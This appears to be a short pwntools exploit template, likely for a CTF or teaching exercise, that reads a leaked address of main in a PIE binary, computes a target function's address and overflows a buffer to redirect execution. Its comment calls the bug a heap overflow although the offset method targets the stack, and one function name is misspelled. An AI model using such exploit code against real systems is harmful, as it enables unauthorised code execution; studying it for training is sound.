# Example for exploiting a program in a PIE environment
# that has a heap overflow vulnerability

from pwn import *
import struct
import sys

# Find shift by using cyclic(1024) => print $rsp before ret => cuclic_find("value of rsp")
shift = 42

path_to_elf = "/path/to_file"

bin_elf = ELF(path_to_elf)
addr_func = bin_elf.functions['function_to_exec'].address
addr_main = bin_elf.functions['main'].address
delta = addr_main - addr_func

bin = process(path_to_elf)
line = bin.recvline()
start = len('Address of main printed on stdout: ')
main_addr = int(line[start:-1], 16)
func_addr = main_addr - delta

bin.sendline("a"*shift + struct.pack("<Q", func_addr))

bin.interactive()

